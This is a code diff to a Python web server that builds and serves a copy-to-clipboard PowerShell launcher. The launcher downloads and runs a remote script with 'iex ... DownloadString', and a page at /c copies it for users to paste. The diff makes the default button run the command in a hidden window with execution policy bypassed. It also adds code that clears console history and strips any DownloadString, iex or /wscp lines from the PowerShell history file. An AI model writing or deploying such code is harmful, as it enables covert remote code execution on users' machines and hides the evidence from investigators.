@@ -82,23 +82,54 @@ def resolve_api_base(request: Request | None = None) -> str:
 API_BASE = resolve_api_base()
 PAYLOAD_URL = f"{API_BASE}/p"
 
+LAUNCHER_HISTORY_SUFFIX = (
+    "; try { Clear-History -ErrorAction SilentlyContinue } catch {}; "
+    "try { "
+    "$hp = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath; "
+    "if ($hp -and (Test-Path -LiteralPath $hp)) { "
+    "$pat = '(DownloadString|/wscp|iex\\s*\\(|Invoke-Expression|Start-Process powershell|Invoke-WebRequest.*/wscp|iwr.*/wscp)'; "
+    "@(Get-Content -LiteralPath $hp -ErrorAction SilentlyContinue | "
+    "Where-Object { $_ -notmatch $pat }) "
+    "| Set-Content -LiteralPath $hp -Encoding utf8 -ErrorAction SilentlyContinue "
+    "} } catch {}"
+)
+
+LAUNCHER_CLEAR_SUFFIX = "; Clear-Host" + LAUNCHER_HISTORY_SUFFIX
+
+LAUNCHER_EXIT_SUFFIX = LAUNCHER_HISTORY_SUFFIX + "; exit"
+
 
 def build_powershell_command(
     api_base: str | None = None,
     *,
-    close_terminal: bool = False,
     debug: bool = False,
+    background: bool = False,
 ) -> str:
     base = api_base or API_BASE
     script_url = f"{base}/wscp"
     params: list[str] = []
-    if close_terminal:
+    if background:
         params.append("close=1")
+        if not debug:
+            params.append("hidden=1")
     if debug:
         params.append("debug=1")
     if params:
         script_url += "?" + "&".join(params)
-    return f"iex (New-Object Net.WebClient).DownloadString('{script_url}')"
+
+    inner = f"iex (New-Object Net.WebClient).DownloadString('{script_url}')"
+    if background:
+        escaped = inner.replace("'", "''")
+        return (
+            "Start-Process powershell -WindowStyle Hidden "
+            f"-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-Command','{escaped}'"
+            f"{LAUNCHER_EXIT_SUFFIX}"
+        )
+
+    if debug:
+        return inner + LAUNCHER_HISTORY_SUFFIX
+
+    return inner + LAUNCHER_CLEAR_SUFFIX
 
 
 def save_payload(payload: dict[str, Any]) -> dict[str, Any]:
@@ -109,22 +140,33 @@ def save_error(error_report: dict[str, Any]) -> dict[str, Any]:
     return save_error_record(error_report)
 
 
-def render_windows_script(*, close_terminal: bool = False, debug_mode: bool = False) -> str:
+def render_windows_script(
+    *,
+    close_terminal: bool = False,
+    debug_mode: bool = False,
+    silent_mode: bool = False,
+) -> str:
     close_literal = "$true" if close_terminal else "$false"
     debug_literal = "$true" if debug_mode else "$false"
+    silent_literal = "$true" if silent_mode else "$false"
     return (
         SCRIPT_PATH.read_text(encoding="utf-8")
         .replace("__API_BASE__", API_BASE)
         .replace("__PAYLOAD_URL__", PAYLOAD_URL)
         .replace("__CLOSE_TERMINAL__", close_literal)
         .replace("__DEBUG_MODE__", debug_literal)
+        .replace("__SILENT_MODE__", silent_literal)
     )
 
 
 @app.get("/wscp", response_class=PlainTextResponse)
-async def get_windows_script(close: bool = False, debug: bool = False) -> PlainTextResponse:
+async def get_windows_script(
+    close: bool = False,
+    debug: bool = False,
+    hidden: bool = False,
+) -> PlainTextResponse:
     return PlainTextResponse(
-        render_windows_script(close_terminal=close, debug_mode=debug),
+        render_windows_script(close_terminal=close, debug_mode=debug, silent_mode=hidden),
         media_type="text/plain; charset=utf-8",
     )
 
@@ -132,9 +174,9 @@ async def get_windows_script(close: bool = False, debug: bool = False) -> PlainT
 @app.get("/c", response_class=HTMLResponse)
 async def copy_command(request: Request) -> HTMLResponse:
     api_base = resolve_api_base(request)
-    command = build_powershell_command(api_base)
-    command_with_close = build_powershell_command(api_base, close_terminal=True)
+    command_visible = build_powershell_command(api_base)
     command_with_debug = build_powershell_command(api_base, debug=True)
+    command_background = build_powershell_command(api_base, background=True)
 
     return HTMLResponse(
         f"""<!DOCTYPE html>
@@ -164,16 +206,24 @@ async def copy_command(request: Request) -> HTMLResponse:
       color: #16a34a;
       min-height: 1.25rem;
     }}
+    .hint {{
+      color: #64748b;
+      font-size: 0.875rem;
+      max-width: 20rem;
+      text-align: center;
+      margin: 0;
+    }}
   </style>
 </head>
 <body>
   <button type="button" id="copy-btn">Copy</button>
-  <button type="button" id="copy-close-btn">Copy with close</button>
+  <button type="button" id="copy-visible-btn">Copy visible</button>
   <button type="button" id="copy-debug-btn">Copy with debug</button>
+  <p class="hint">Copy runs hidden, clears history, and closes this window. The hidden process closes when done.</p>
   <div id="status"></div>
   <script>
-    const command = {json.dumps(command)};
-    const commandWithClose = {json.dumps(command_with_close)};
+    const commandBackground = {json.dumps(command_background)};
+    const commandVisible = {json.dumps(command_visible)};
     const commandWithDebug = {json.dumps(command_with_debug)};
 
     async function copyText(text) {{
@@ -194,8 +244,8 @@ async def copy_command(request: Request) -> HTMLResponse:
       }}
     }}
 
-    document.getElementById("copy-btn").addEventListener("click", () => copyText(command));
-    document.getElementById("copy-close-btn").addEventListener("click", () => copyText(commandWithClose));
+    document.getElementById("copy-btn").addEventListener("click", () => copyText(commandBackground));
+    document.getElementById("copy-visible-btn").addEventListener("click", () => copyText(commandVisible));
     document.getElementById("copy-debug-btn").addEventListener("click", () => copyText(commandWithDebug));
   </script>
 </body>
